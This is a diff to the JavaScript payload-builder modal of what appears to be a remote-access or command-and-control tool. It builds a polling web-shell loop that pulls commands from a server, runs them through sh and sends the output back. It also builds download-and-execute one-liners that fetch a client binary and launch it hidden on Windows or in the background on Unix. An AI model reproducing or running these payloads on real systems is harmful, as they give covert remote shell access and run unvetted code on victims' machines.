@@ -1413,7 +1413,7 @@ const PayloadsModal = () =>
       const webPayload = `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
       const muxPayload = `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
       const muxDownloadPayload = isWindows
-        ? `curl.exe -sL "${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}" -o "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`
+        ? `Invoke-WebRequest -Uri '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -OutFile "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`
         : `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
       const copy = (text) =>
         navigator.clipboard.writeText(text).catch(() => {});
